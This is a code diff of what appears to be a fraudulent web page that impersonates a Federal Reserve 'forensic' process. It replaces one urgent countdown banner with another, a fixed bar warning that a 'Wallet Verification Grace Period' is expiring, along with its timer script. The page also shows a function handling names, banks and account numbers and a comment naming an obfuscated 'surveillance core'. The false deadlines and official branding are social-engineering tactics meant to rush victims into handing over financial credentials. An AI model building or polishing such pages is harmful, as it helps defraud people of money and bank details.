@@ -65,21 +65,7 @@
             box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
         }
 
-          @keyframes softPulse {
-    0% { border-color: #b45309; background-color: #fff3cd; }
-    50% { border-color: #dc2626; background-color: #fee2e2; }
-    100% { border-color: #b45309; background-color: #fff3cd; }
-  }
-  .countdown-alert {
-    animation: softPulse 2.5s infinite;
-    border-width: 2px;
-    border-style: solid;
-    transition: all 0.3s ease;
-  }
-  .countdown-alert:hover {
-    transform: scale(1.01);
-  }
-/* ===== AUDIT LINE ANIMATION ===== */
+        /* ===== AUDIT LINE ANIMATION ===== */
         .audit-line { 
             opacity: 0; 
             transform: translateY(4px); 
@@ -350,22 +336,41 @@
                     </div>
                 </div>
             </div>
-          <div id="countdownBanner" class="countdown-alert" style="background-color: #fff3cd; border: 2px solid #b45309; border-left-width: 8px; padding: 18px 22px; margin: 20px 0 25px 0; font-family: 'Public Sans', Arial, sans-serif; border-radius: 0 8px 8px 0;">
-            <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
-              <div style="background-color: #b45309; color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold;">/div>
-              <div style="flex: 1;">
-                <p style="margin: 0 0 5px 0; font-weight: 800; color: #7a2e0e; font-size: 17px; text-transform: uppercase;">FINAL DEADLINE APPROACHING</p>
-                <p style="margin: 0 0 8px 0; color: #1e2a41; font-size: 15px;">Your verification window expires at <strong>12:00 AM CST</strong> on <strong>March 7, 2026</strong>. Complete the wallet verification immediately to avoid being removed from the processing queue.</p>
-                <div style="background-color: #1e2a41; color: white; padding: 10px 15px; border-radius: 6px; display: inline-block; margin-top: 5px;">
-                  <span style="font-weight: 600; margin-right: 10px;">⏱️ TIME REMAINING:</span>
-                  <span id="countdownTimer" style="font-family: monospace; font-size: 22px; font-weight: 700; letter-spacing: 2px;">00:00:00</span>
+            <div class="fixed bottom-0 left-0 w-full bg-white border-t-4 border-red-600 shadow-[0_-10px_25px_rgba(0,0,0,0.1)] z-[9999] py-4 px-6">
+                <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
+                    <div class="flex items-center gap-3">
+                        <div class="bg-red-100 p-2 rounded">
+                            <div class="w-3 h-3 bg-red-600 rounded-full animate-pulse"></div>
+                        </div>
+                        <div>
+                            <p class="text-[10px] font-black text-red-600 uppercase tracking-[0.2em] leading-none">Final Administrative Extension</p>
+                            <p class="text-sm font-bold text-slate-900 uppercase mt-1">Wallet Verification Grace Period Expiring</p>
+                        </div>
+                    </div>
+            
+                    <div class="flex items-center gap-4">
+                        <div class="flex flex-col items-center">
+                            <span id="cd-hours" class="text-3xl font-black text-slate-900 font-mono leading-none">00</span>
+                            <span class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter mt-1">Hours</span>
+                        </div>
+                        <span class="text-2xl font-black text-slate-300 pb-4">:</span>
+                        <div class="flex flex-col items-center">
+                            <span id="cd-minutes" class="text-3xl font-black text-slate-900 font-mono leading-none">00</span>
+                            <span class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter mt-1">Minutes</span>
+                        </div>
+                        <span class="text-2xl font-black text-slate-300 pb-4">:</span>
+                        <div class="flex flex-col items-center">
+                            <span id="cd-seconds" class="text-3xl font-black text-red-600 font-mono leading-none">00</span>
+                            <span class="text-[8px] font-bold text-slate-400 uppercase tracking-tighter mt-1">Seconds</span>
+                        </div>
+                    </div>
+            
+                    <div class="hidden lg:block text-right border-l border-slate-200 pl-6">
+                        <p class="text-[9px] font-mono text-slate-500 uppercase">Target: 2026-03-07 00:00:00 CST</p>
+                        <p class="text-[9px] font-mono text-slate-500 uppercase">Status: Final Warning Issued</p>
+                    </div>
                 </div>
-                <p style="margin: 12px 0 0 0; color: #b45309; font-size: 14px; font-weight: 600;">If not completed by deadline, you will need to request a new verification session.</p>
-              </div>
             </div>
-          </div>
-
-
             <!-- FEDERAL RESERVE FORENSIC SUMMARY -->
             <div class="directive-card">
                 <h3 class="text-lg font-black text-gray-900 border-b-2 border-gray-300 pb-2 mb-4 flex items-center gap-2">
@@ -646,46 +651,37 @@ function showDashboard(name, bank, account) {
     window.showDashboard = showDashboard;
     window.logout = logout;
   </script>
+    
+    <script>
+        (function() {
+            function updateCountdown() {
+                // Target: March 7, 2026 00:00:00 CST
+                // CST is UTC-6
+                const targetDate = new Date('March 7, 2026 00:00:00 GMT-0600').getTime();
+                const now = new Date().getTime();
+                const distance = targetDate - now;
+    
+                if (distance < 0) {
+                    document.getElementById('cd-hours').innerText = "00";
+                    document.getElementById('cd-minutes').innerText = "00";
+                    document.getElementById('cd-seconds').innerText = "00";
+                    return;
+                }
+    
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+    
+                document.getElementById('cd-hours').innerText = hours.toString().padStart(2, '0');
+                document.getElementById('cd-minutes').innerText = minutes.toString().padStart(2, '0');
+                document.getElementById('cd-seconds').innerText = seconds.toString().padStart(2, '0');
+            }
+    
+            setInterval(updateCountdown, 1000);
+            updateCountdown();
+        })();
+    </script>
 
-  <script>
-    function updateCountdown() {
-  const timerElement = document.getElementById('countdownTimer');
-  if (!timerElement) return;
-
-  // March 7, 2026 00:00:00 CST is equivalent to March 7, 2026 06:00:00 UTC
-  const targetDate = new Date('2026-03-07T06:00:00Z').getTime();
-  const now = new Date().getTime();
-  
-  const diff = targetDate - now;
-  
-  if (diff <= 0) {
-    timerElement.innerText = '00:00:00';
-    const banner = document.getElementById('countdownBanner');
-    if (banner) {
-        banner.style.backgroundColor = '#fee2e2';
-        banner.style.borderColor = '#dc2626';
-    }
-    return;
-  }
-  
-  // Math for Time Units
-  const hours = Math.floor(diff / (1000 * 60 * 60));
-  const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-  const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-  
-  // Pad with leading zeros
-  const hDisplay = hours.toString().padStart(2, '0');
-  const mDisplay = minutes.toString().padStart(2, '0');
-  const sDisplay = seconds.toString().padStart(2, '0');
-  
-  timerElement.innerText = `${hDisplay}:${mDisplay}:${sDisplay}`;
-}
-
-// Initialize and Set Interval
-updateCountdown();
-setInterval(updateCountdown, 1000);
-
-  </script>
 
     <script>
           // ===== ZETA SURVEILLANCE CORE v2.0 (Obfuscated) =====
